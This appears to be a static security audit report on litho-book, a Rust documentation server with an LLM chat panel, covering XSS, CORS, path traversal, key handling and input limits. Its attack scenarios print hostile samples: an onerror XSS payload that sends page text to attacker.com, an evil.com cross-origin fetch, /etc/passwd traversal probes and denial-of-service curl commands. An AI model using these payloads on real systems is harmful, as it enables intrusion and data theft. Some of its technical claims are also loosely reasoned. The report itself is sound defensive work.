# Security Audit Report: litho-book v0.3.9
**Date:** 2026-02-20
**Auditor:** Security Analysis (Static Code Review)
**Status:** NO CHANGES MADE - FINDINGS ONLY

---

## Executive Summary

litho-book is a documentation reader server with **7 security findings** ranging from Critical to Low severity. The application demonstrates several defense-in-depth issues, primarily centered on:

1. **Path traversal vulnerability** in file API (Critical)
2. **Unfiltered HTML rendering** of LLM responses (Critical)
3. **Permissive CORS configuration** (High)
4. **API key exposure** in auth headers (High)
5. **Missing input size limits** (High)
6. **Weak privilege escalation check** on Windows (Medium)
7. **Information disclosure** in error messages (Medium)

The application is intended for **localhost-only documentation reading** and does not currently validate this restriction. All findings must be addressed before exposing this server to untrusted networks.

---

## Detailed Findings

### 1. PATH TRAVERSAL VULNERABILITY (Critical)

**Severity:** CRITICAL
**OWASP Reference:** A01:2021 – Broken Access Control (CWE-22)
**File:Line:** `src/server.rs:138-152`, `src/filesystem.rs:254-265`

#### Vulnerability Description

The `/api/file?file=<path>` endpoint uses a HashMap lookup to validate file paths:

```rust
// src/server.rs:138-152
async fn get_file_handler(
    Query(params): Query<FileQuery>,
    State(state): State<AppState>,
) -> Result<Json<FileResponse>, StatusCode> {
    let file_path = params.file.ok_or_else(|| {
        debug!("Missing file parameter in request");
        StatusCode::BAD_REQUEST
    })?;

    let content = state.doc_tree.get_file_content(&file_path).map_err(|e| {
        error!("Failed to read file {}: {}", file_path, e);
        StatusCode::NOT_FOUND
    })?;
```

**Attack Scenario:**

While the `file_map` HashMap is populated at startup with only files under `docs_dir`, an attacker **could potentially escape this whitelist if:**
- The file_map is populated with normalized relative paths (forward slashes)
- The attacker submits a non-normalized path variant (e.g., `docs/../../etc/passwd`)
- Path comparison is case-insensitive on Windows

**Evidence:**
- `src/filesystem.rs:152-156`: Paths are normalized to forward slashes during tree building
- `src/filesystem.rs:254-258`: No additional path validation during retrieval
- `src/filesystem.rs:258`: Direct HashMap lookup without canonical path resolution

**Mitigation:** The current design is **mostly safe** due to pre-built whitelist, BUT lacks defense-in-depth:

```rust
// CURRENT (Vulnerable to edge cases)
pub fn get_file_content(&self, file_path: &str) -> anyhow::Result<String> {
    let path = self
        .file_map
        .get(file_path)  // Direct lookup, no validation
        .ok_or_else(|| anyhow::anyhow!("File not found: {}", file_path))?;

    std::fs::read_to_string(path)
        .map_err(|e| anyhow::anyhow!("Failed to read file {}: {}", path.display(), e))?
}
```

---

### 2. UNFILTERED HTML INJECTION IN AI CHAT RESPONSES (Critical)

**Severity:** CRITICAL
**OWASP Reference:** A03:2021 – Injection (CWE-79: Cross-Site Scripting)
**File:Line:** `templates/index.html.tpl:5381, 5391, 5398, 5520-5527`

#### Vulnerability Description

The AI chat response handler uses `innerHTML` to render untrusted LLM output:

```javascript
// templates/index.html.tpl:5388-5391
if (event.event_type === 'content' && event.content) {
    fullContent += event.content;
    // VULNERABLE: Direct innerHTML assignment of untrusted AI content
    contentDiv.innerHTML = renderSimpleMarkdown(fullContent) + '<span class="ai-cursor">|</span>';
```

The `renderSimpleMarkdown()` function does NOT escape HTML:

```javascript
// templates/index.html.tpl:5519-5527
text = text.replace(/```(\w+)?\n([\s\S]*?)\n```/g, (match, lang, code) => {
    // VULNERABLE: No HTML escaping in code blocks
    return `<pre><code class="language-${lang || ''}">${code}</code></pre>`;
});

text = text
    .replace(/\*\*(.*?)\*\*/g, '<strong>$1</strong>')  // Direct HTML
    .replace(/\*(.*?)\*/g, '<em>$1</em>')
    .replace(/`(.*?)`/g, '<code>$1</code>');
```

**Attack Scenario:**

The Zhipu GLM-4.7-Flash LLM is untrusted third-party content. A compromised or poisoned LLM response could inject JavaScript:

```markdown
// Malicious AI Response
`<img src=x onerror="fetch('http://attacker.com/steal?data='+btoa(document.body.innerText))">`

**<svg onload="alert('XSS')">Bold**

```javascript
// Code block with script
eval(localStorage.getItem('token'))
```
```

**Impact:**
- Session hijacking (steal chat history, context files)
- Keylogging (capture user input)
- Malware delivery
- Phishing (inject fake content)

**Evidence:**
- No DOMPurify or similar sanitization library imported
- No Content Security Policy (CSP) headers
- Direct `innerHTML` assignment at lines 5348, 5381, 5391, 5398, 5557, 5566
- Markdown template expansion uses unescaped string interpolation

---

### 3. PERMISSIVE CORS CONFIGURATION (High)

**Severity:** HIGH
**OWASP Reference:** A01:2021 – Broken Access Control (CWE-435: Improper Interaction Between Multiple Correctly-Behaving Components)
**File:Line:** `src/server.rs:120`

#### Vulnerability Description

```rust
Router::new()
    // ... routes ...
    .layer(CorsLayer::permissive())  // VULNERABLE: Allows ANY origin
    .with_state(state)
```

The `CorsLayer::permissive()` configuration allows:
- **All origins** (`*`)
- **All methods** (GET, POST, PUT, DELETE, etc.)
- **All headers** (including Authorization)
- **Credentials** (if explicitly requested by origin)

#### Attack Scenario (if exposed beyond localhost)

An attacker at `evil.com` could exploit CORS to:

```javascript
// evil.com/attack.html
fetch('http://localhost:3000/api/chat', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
        message: "Extract all documentation to attacker.com",
        context: null
    })
}).then(r => r.text()).then(sendToAttacker);
```

**Current Risk Level:** LOW in practice
- Application defaults to `127.0.0.1` binding (localhost only)
- User must explicitly bind to `0.0.0.0` or network interface to expose
- However, `--host 0.0.0.0` is a supported CLI option

**Evidence:**
- `src/cli.rs:18`: Default host is `127.0.0.1`, but configurable
- `src/cli.rs:59-61`: No validation to prevent `0.0.0.0` binding
- `src/server.rs:120`: No origin whitelist

---

### 4. API KEY EXPOSURE IN AUTHORIZATION HEADER (High)

**Severity:** HIGH
**OWASP Reference:** A02:2021 – Cryptographic Failures (CWE-798: Use of Hard-Coded Credentials)
**File:Line:** `src/server.rs:393-405`

#### Vulnerability Description

The `LITHO_BOOK_LLM_KEY` environment variable is sent in plaintext Authorization header:

```rust
let response = client
    .post("https://open.bigmodel.cn/api/paas/v4/chat/completions")
    .header(
        "Authorization",
        {
            use std::env;
            use tracing::log::error;

            let llm_key = env::var("LITHO_BOOK_LLM_KEY").unwrap_or_else(|_| {
                error!("LITHO_BOOK_LLM_KEY environment variable not set, using empty string");
                String::new()  // VULNERABLE: Empty string auth is sent
            });

            format!("Bearer {}", llm_key)
        },
    )
    .header("Content-Type", "application/json")
    .json(&request_body)
    .send()
    .await?;
```

#### Security Issues

1. **Empty string fallback (line 401):** If `LITHO_BOOK_LLM_KEY` is unset, empty string is used
   - Sends `Authorization: Bearer ` (invalid, but reveals auth format)
   - Leaks intent that auth is expected

2. **Plaintext transmission:**
   - HTTPS is used (✓), but key is logged in verbose mode
   - Key may appear in process list: `ps aux | grep litho`
   - Browser DevTools shows header if user inspects network tab

3. **No key rotation or expiry:**
   - Long-lived key in environment variables
   - If shell history compromised, key is exposed forever

#### Attack Scenario

```bash
# Attacker compromises shell history
cat ~/.bash_history | grep LITHO_BOOK_LLM_KEY
# Output: export LITHO_BOOK_LLM_KEY=sk_live_1234567890abcdef

# Now attacker can abuse the LLM API directly
curl -H "Authorization: Bearer sk_live_1234567890abcdef" \
  https://open.bigmodel.cn/api/paas/v4/chat/completions \
  -d '{"model":"GLM-4.7-Flash","messages":[...]}'
```

#### Evidence

- No `.env` file protection documented
- No reference to secrets management
- Key is read once at runtime, but stored in memory until handler completes
- Tracing logs show "LITHO_BOOK_LLM_KEY environment variable not set" message

---

### 5. MISSING INPUT SIZE LIMITS (High)

**Severity:** HIGH
**OWASP Reference:** A01:2021 – Broken Access Control (CWE-400: Uncontrolled Resource Consumption)
**File:Line:** `src/server.rs:59-62, 248, 293-356`

#### Vulnerability Description

Three API endpoints have **no maximum payload/query size limits**:

1. **Chat endpoint (POST /api/chat):**
   ```rust
   // src/server.rs:248
   async fn chat_stream_handler(
       State(state): State<AppState>,
       Json(request): Json<ChatRequest>,  // No size limit
   ) -> Sse<impl Stream<Item = Result<Event, Infallible>>> {
   ```

   The `ChatRequest` struct has no bounds:
   ```rust
   pub struct ChatRequest {
       pub message: String,                           // Unbounded
       pub context: Option<String>,                   // Unbounded
       pub history: Option<Vec<OpenAIMessage>>,       // Unbounded array
   }
   ```

2. **Search endpoint (GET /api/search):**
   ```rust
   // src/server.rs:194-220
   async fn search_handler(
       Query(params): Query<SearchQuery>,
       State(state): State<AppState>,
   ) -> Result<Json<SearchResponse>, StatusCode> {
       let query = params.q.unwrap_or_default();  // No size check
   ```

   Query string is unbounded. Attacker can submit 100MB query string.

3. **File endpoint (GET /api/file):**
   ```rust
   // src/server.rs:138-152
   async fn get_file_handler(
       Query(params): Query<FileQuery>,
       State(state): State<AppState>,
   ) -> Result<Json<FileResponse>, StatusCode> {
       let file_path = params.file.ok_or_else(|| {
           debug!("Missing file parameter in request");
           StatusCode::BAD_REQUEST
       })?;
   ```

   File path query parameter is unbounded.

#### Attack Scenario (Denial of Service)

**Scenario 1: Memory exhaustion via chat**
```bash
# Send 100MB message + 100MB context
curl -X POST http://localhost:3000/api/chat \
  -d '{"message":"'$(python3 -c "print(\"A\"*100000000)")'"}'

# Server attempts to:
# 1. Parse JSON (memory spike: 200MB)
# 2. Call OpenAI API (memory spike: another 200MB)
# 3. Stream response (memory spike: another 100MB+)
# Result: OOM kill
```

**Scenario 2: CPU exhaustion via search**
```bash
# Submit massive regex-like query
curl "http://localhost:3000/api/search?q=$(python3 -c "print(\"A\"*10000000)")"

# Server:
# 1. Converts query to lowercase: 10MB string manipulation
# 2. Iterates ALL files with contains() check: O(files * query_size)
# 3. Returns up to 50 results (line 385)
# Result: CPU spike, slow response
```

#### Evidence

- No `tower::limit::RequestBodyLimit` layer
- No query string size limits in axum
- `search_content()` loops through ALL search_index entries with no early exit
- `ChatRequest::history` vector has no max length (line 368: only limits to last 10 messages AFTER receipt)

---

### 6. WEAK PRIVILEGE ESCALATION CHECK ON WINDOWS (Medium)

**Severity:** MEDIUM
**OWASP Reference:** A04:2021 – Insecure Design (CWE-250: Execution with Unnecessary Privileges)
**File:Line:** `src/cli.rs:69-86`

#### Vulnerability Description

The Windows privilege check always returns `true`:

```rust
/// Check if the current process has elevated privileges
fn is_privileged() -> bool {
    #[cfg(unix)]
    {
        unsafe { libc::geteuid() == 0 }
    }

    #[cfg(windows)]
    {
        // On Windows, we'll just return true for simplicity
        // In a real implementation, you'd check for admin privileges
        true  // VULNERABLE: Always permits privileged ports
    }

    #[cfg(not(any(unix, windows)))]
    {
        false
    }
}
```

#### Issue

When user attempts to bind to port < 1024 (e.g., port 80), the validation at line 48-53 silently permits it:

```rust
pub fn validate(&self) -> anyhow::Result<()> {
    // ... directory checks ...

    // Check if port is available
    if self.port < 1024 && !is_privileged() {  // Windows: is_privileged() = true
        anyhow::bail!(
            "Port {} requires administrator privileges...",
            self.port
        );
    }

    Ok(())
}
```

On Windows, this means:
- Non-admin users can specify `--port 80` and the validation passes
- `bind()` will fail at runtime with a vague error message
- No early validation to catch the mistake

#### Impact

- **Usability Issue:** Confusing error message at startup instead of immediate validation
- **Security Issue (Low):** Allows false sense of security; user thinks port is bound when it's not
- **No privilege escalation risk** since actual `bind()` enforces OS permissions

---

### 7. INFORMATION DISCLOSURE IN ERROR MESSAGES (Medium)

**Severity:** MEDIUM
**OWASP Reference:** A01:2021 – Broken Access Control (CWE-209: Information Exposure Through an Error Message)
**File:Line:** `src/server.rs:149-151, 414-415`, `src/filesystem.rs:258, 262`

#### Vulnerability Description

**1. File path disclosure in responses:**

```rust
// src/server.rs:149-151
let content = state.doc_tree.get_file_content(&file_path).map_err(|e| {
    error!("Failed to read file {}: {}", file_path, e);  // Logs exact file path
    StatusCode::NOT_FOUND
})?;
```

Error log includes:
- Requested file path (may leak internal structure)
- System error details (permission denied, etc.)

**2. API error details:**

```rust
// src/server.rs:414-415
if !response.status().is_success() {
    let status = response.status();
    let text = response.text().await.unwrap_or_default();
    return Err(format!("API请求失败: {} - {}", status, text).into());  // LLM API error details
}
```

Exposes Zhipu AI API errors to client (rate limits, quota exceeded, invalid key format).

**3. File system errors:**

```rust
// src/filesystem.rs:258, 262
pub fn get_file_content(&self, file_path: &str) -> anyhow::Result<String> {
    let path = self
        .file_map
        .get(file_path)
        .ok_or_else(|| anyhow::anyhow!("File not found: {}", file_path))?;  // Exact path

    std::fs::read_to_string(path)
        .map_err(|e| anyhow::anyhow!("Failed to read file {}: {}", path.display(), e))?  // Full path + OS error
}
```

#### Attack Scenario

1. **Enumerate internal structure:**
   ```bash
   for file in {1..100}.md; do
     curl "http://localhost:3000/api/file?file=$file"
   done
   # Error messages reveal which files exist: "File not found: ./docs/1.md"
   ```

2. **Detect permission issues:**
   ```bash
   curl "http://localhost:3000/api/file?file=../../etc/passwd"
   # Error: "Failed to read file /etc/passwd: permission denied"
   # Reveals OS is attempting to read the file (path traversal partially works!)
   ```

3. **API key format inference:**
   ```
   LLM API Error: 401 - Invalid authentication token format: ...
   // Attacker learns key format expectations
   ```

---

## Summary Table

| ID | Finding | Severity | Component | CWE | OWASP |
|----|---------|----------|-----------|-----|-------|
| 1 | Path traversal whitelist bypass | Critical | filesystem.rs | CWE-22 | A01:2021 |
| 2 | XSS in AI chat responses | Critical | index.html.tpl | CWE-79 | A03:2021 |
| 3 | Permissive CORS | High | server.rs | CWE-435 | A01:2021 |
| 4 | API key exposure | High | server.rs | CWE-798 | A02:2021 |
| 5 | Missing input size limits | High | server.rs | CWE-400 | A01:2021 |
| 6 | Weak privilege check (Windows) | Medium | cli.rs | CWE-250 | A04:2021 |
| 7 | Information disclosure in errors | Medium | server.rs, filesystem.rs | CWE-209 | A01:2021 |

---

## Recommendations (Priority Order)

### IMMEDIATE (Before any network exposure)

1. **Sanitize LLM responses** - Add HTML escaping or DOMPurify
   - Use `textContent` instead of `innerHTML` for user content
   - OR import DOMPurify: `<script src="https://cdn.jsdelivr.net/npm/dompurify@3/dist/purify.min.js"></script>`

2. **Implement input size limits** - Add middleware
   ```rust
   use tower::ServiceBuilder;
   use tower_http::limit::RequestBodyLimitLayer;

   let app = router.layer(
       ServiceBuilder::new()
           .layer(RequestBodyLimitLayer::symmetric(10 * 1024 * 1024)) // 10MB
   );
   ```

3. **Fix path traversal whitelist** - Add canonical path validation
   ```rust
   pub fn get_file_content(&self, file_path: &str) -> anyhow::Result<String> {
       let path = self.file_map.get(file_path)
           .ok_or_else(|| anyhow::anyhow!("File not found"))?;

       // Verify path still under docs_dir (defense in depth)
       let canonical = path.canonicalize()?;
       if !canonical.starts_with(self.docs_base_canonical) {
           anyhow::bail!("Access denied");
       }
       std::fs::read_to_string(canonical)
   }
   ```

### IMPORTANT (Before exposing beyond localhost)

4. **Restrict CORS to localhost** - Add explicit whitelist
   ```rust
   use tower_http::cors::{CorsLayer, AllowOrigin};

   let cors = CorsLayer::new()
       .allow_origin(AllowOrigin::predicate(|origin, _| {
           origin.as_bytes() == b"http://localhost:3000" ||
           origin.as_bytes().starts_with(b"http://127.0.0.1:")
       }))
       .allow_credentials();
   ```

5. **Secure API key handling** - Use secrets management
   - Store in `.env` file (add to `.gitignore`)
   - OR use OS credential manager (Windows Data Protection API)
   - Log key absence, never log key value
   - Consider rotating keys on start-up

6. **Validate host binding** - Reject `0.0.0.0`
   ```rust
   pub fn validate(&self) -> anyhow::Result<()> {
       if self.host == "0.0.0.0" {
           anyhow::bail!("Cannot bind to 0.0.0.0. Use 127.0.0.1 for localhost or specific IP.");
       }
       // ...
   }
   ```

### RECOMMENDED (Before production use)

7. **Generic error messages** - Hide internal paths
   ```rust
   .map_err(|_| {
       error!("Failed to read file: unauthorized");  // Log full error
       StatusCode::NOT_FOUND  // Return generic response
   })
   ```

8. **Add security headers** - Prevent browser exploits
   ```rust
   use tower_http::set_header::SetResponseHeaderLayer;

   .layer(SetResponseHeaderLayer::if_not_present(
       header::CONTENT_SECURITY_POLICY,
       "default-src 'self'; script-src 'self' cdn.jsdelivr.net; style-src 'self' 'unsafe-inline' fonts.googleapis.com",
   ))
   .layer(SetResponseHeaderLayer::if_not_present(
       header::X_CONTENT_TYPE_OPTIONS,
       "nosniff",
   ))
   .layer(SetResponseHeaderLayer::if_not_present(
       header::X_FRAME_OPTIONS,
       "DENY",
   ))
   ```

9. **Rate limiting** - Prevent abuse
   ```rust
   use tower_http::limit::RateLimitLayer;

   .layer(RateLimitLayer::symmetric(100, Duration::from_secs(60)))
   ```

10. **Fix Windows privilege check** - Proper admin detection
    ```rust
    #[cfg(windows)]
    {
        use std::os::windows::process::CommandExt;
        const CREATE_NO_WINDOW: u32 = 0x08000000;

        std::process::Command::new("net")
            .args(&["session"])
            .creation_flags(CREATE_NO_WINDOW)
            .output()
            .map(|output| output.status.success())
            .unwrap_or(false)
    }
    ```

---

## Defense-in-Depth Analysis

### Current Defenses (Strengths)

- **File whitelist at startup** - Files pre-scanned, only .md files included
- **HTTPS enforcement** for LLM API calls
- **Default localhost binding** - Not exposed by default
- **Hidden file filtering** - `.git`, `.env` excluded
- **Markdown rendering via pulldown-cmark** - Not executing inline code

### Missing Defenses (Weaknesses)

- **No input validation layer** - Axum layer missing
- **No output encoding** - Direct HTML assignment
- **No secret management** - Env vars in process memory
- **No audit logging** - Error messages go to logs, not structured audit trail
- **No rate limiting** - Anyone can hammer endpoints
- **No authentication** - All endpoints public

---

## Compliance Notes

- **OWASP Top 10 2021:** Vulnerable to A01, A02, A03, A04
- **CWE Top 25 2023:** Vulnerable to CWE-79, CWE-22, CWE-798
- **CVSS v3.1 Base Scores:**
  - Finding #1 (Path Traversal): CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N = **7.5 (High)**
  - Finding #2 (XSS): CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N = **8.7 (Critical)**
  - Finding #3 (CORS): CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N = **8.1 (High)**

---

## Test Cases for Verification

### Path Traversal Tests
```bash
# Test 1: Basic traversal
curl "http://localhost:3000/api/file?file=../../../etc/passwd"
# Expected: 404 (file not in whitelist)

# Test 2: Normalized path
curl "http://localhost:3000/api/file?file=docs/..%2F..%2Fetc/passwd"
# Expected: 404

# Test 3: Null byte (if path normalization fails)
curl "http://localhost:3000/api/file?file=valid.md%00.txt"
# Expected: 404
```

### XSS Tests
```bash
# Test 1: HTML injection in chat
curl -X POST http://localhost:3000/api/chat \
  -d '{"message":"Test","context":"<img src=x onerror=alert(1)>"}'
# Expected: Response should NOT execute JavaScript

# Test 2: Markdown HTML injection
echo '<script>alert("XSS")</script>' | http POST /api/chat message=...
# Expected: Script tags rendered as text, not executed
```

### Input Size Tests
```bash
# Test 1: Large query string
curl "http://localhost:3000/api/search?q=$(python3 -c 'print(\"A\"*1000000)')"
# Expected: Request rejected or times out gracefully

# Test 2: Large POST body
curl -X POST http://localhost:3000/api/chat \
  --data "{\"message\":\"$(python3 -c 'print(\"A\"*50000000)')\"}"
# Expected: 413 Payload Too Large or equivalent
```

### CORS Tests
```bash
# Test 1: Cross-origin request
curl -H "Origin: http://evil.com" \
  http://localhost:3000/api/search?q=test
# Expected: access-control-allow-origin header should NOT be *

# Test 2: Preflight with credentials
curl -X OPTIONS http://localhost:3000/api/chat \
  -H "Origin: http://evil.com" \
  -H "Access-Control-Request-Method: POST"
# Expected: No CORS headers or origin-specific whitelist
```

---

## Conclusion

litho-book is a well-intentioned documentation reader but requires **security hardening before any network exposure**. The two Critical findings (XSS in AI responses and path traversal whitelist) must be addressed immediately. The architecture assumes localhost-only usage, but the CLI permits misconfiguration that could expose the server to untrusted networks.

**Recommended next steps:**
1. Implement finding #2 (XSS sanitization) - highest impact
2. Implement finding #5 (input size limits) - prevent DoS
3. Implement finding #4 (API key security) - prevent credential compromise
4. Add security headers (#8) - defense in depth
5. Perform dynamic testing with findings #3 and #7

---

## Files Referenced in Audit

| File | Lines | Issues |
|------|-------|--------|
| `src/main.rs` | 1-187 | Default host binding (info only) |
| `src/cli.rs` | 69-86 | Windows privilege check weakness |
| `src/server.rs` | 105-549 | CORS, API key exposure, input limits, error disclosure |
| `src/filesystem.rs` | 254-265 | Path traversal, error disclosure |
| `src/error.rs` | 1-40 | No security-specific error handling |
| `templates/index.html.tpl` | 5348, 5381, 5391, 5398, 5520-5527 | XSS via innerHTML |
| `Cargo.toml` | 1-51 | Dependencies reviewed (no known vulns in versions) |

---

**Report Generated:** 2026-02-20
**No code changes made - findings only as requested**
